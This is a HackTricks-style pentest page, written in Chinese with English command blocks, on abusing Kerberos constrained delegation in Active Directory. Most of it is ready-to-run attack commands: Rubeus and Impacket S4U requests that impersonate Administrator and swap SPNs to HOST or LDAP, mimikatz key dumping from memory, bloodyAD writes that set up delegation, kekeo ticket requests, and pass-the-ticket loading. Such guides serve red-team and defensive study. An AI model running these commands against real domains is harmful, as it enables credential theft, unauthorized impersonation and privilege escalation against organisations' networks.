# 受限委派

{{#include ../../banners/hacktricks-training.md}}

## 受限委派

使用此功能，Domain admin 可以**允许**一台计算机对任意机器的任意**service**进行**冒充用户或计算机**。

- **Service for User to self (_S4U2self_):** 如果一个 **service account** 的 _userAccountControl_ 值包含 [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D)，那么它可以代表任何其他用户为自身（该 service）获取一个 TGS。
- **Service for User to Proxy(_S4U2proxy_):** 一个 **service account** 可以代表任意用户为 **msDS-AllowedToDelegateTo** 中设置的服务获取 TGS。要做到这点，它首先需要一个该用户到它自身的 TGS，但它可以先使用 S4U2self 来获取该 TGS，然后再请求另一个。

**注意**: 如果在 AD 中某个用户被标记为 ‘_Account is sensitive and cannot be delegated_’，你将**无法冒充**他们。

这意味着如果你**获取到该 service 的 hash**，你可以**冒充用户**并以他们的名义在指定机器上访问任何**service**（可能导致**privesc**）。

此外，你**不仅能访问用户可以被冒充的那个 service，还能访问任何 service**，因为 SPN（请求的 service 名称）不会被校验（在 ticket 中这部分没有被加密/签名）。因此，例如如果你有对 **CIFS service** 的访问，你也可以使用 Rubeus 的 `/altservice` 标志访问 **HOST service**。同样的 SPN 交换弱点也被 **Impacket getST -altservice** 和其他工具利用。

此外，对 **DC 上的 LDAP service** 的访问，是利用 **DCSync** 所需的条件。
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Cross-domain constrained delegation notes (2025+)

自 **Windows Server 2012/2012 R2** 起，KDC 通过 S4U2Proxy 扩展支持 **constrained delegation across domains/forests**。现代版本（Windows Server 2016–2025）保留此行为，并新增两个 PAC SIDs 用于标识协议转换：

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) 当用户正常认证时。
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) 当服务通过协议转换断言了身份时。

当跨域使用协议转换时，在 PAC 中应看到 `SERVICE_ASSERTED_IDENTITY`，以确认 S4U2Proxy 步骤已成功。

### Impacket / Linux tooling (altservice & full S4U)

Recent Impacket (0.11.x+) exposes the same S4U chain and SPN swapping as Rubeus:
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'
```
如果你更喜欢先伪造用户的 ST（例如，仅离线哈希），可以将 **ticketer.py** 与 **getST.py** 配合用于 S4U2Proxy。参见 Impacket 的开放 issue #1713 了解当前的奇异情况（当伪造的 ST 与 SPN key 不匹配时会出现 KRB_AP_ERR_MODIFIED）。

### 从低权限凭据自动化设置委派

如果你已经对计算机或服务帐户拥有 **GenericAll/WriteDACL**，可以使用 **bloodyAD**（2024+）在不使用 RSAT 的情况下远程推送所需属性：
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
这让你在能够写入这些属性后，在没有 DA 权限的情况下构建用于 privesc 的受限委派路径。

- 第 1 步：**获取允许的服务的 TGT**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> 有 **其他方法可以获取 TGT ticket** 或 **RC4** 或 **AES256**，而无需在计算机上成为 SYSTEM，例如 Printer Bug、unconstrain delegation、NTLM relaying 和 Active Directory Certificate Service abuse
>
> **只要拥有该 TGT ticket（或其哈希），你就可以执行此攻击，而无需攻陷整个计算机。**

- 步骤2：**为服务获取 TGS 来模拟用户**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**More information in ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) 和 [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)

## 参考资料
- [Kerberos Constrained Delegation Overview (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Impacket issue #1713 – S4U2proxy forged service ticket errors](https://github.com/fortra/impacket/issues/1713)

{{#include ../../banners/hacktricks-training.md}}
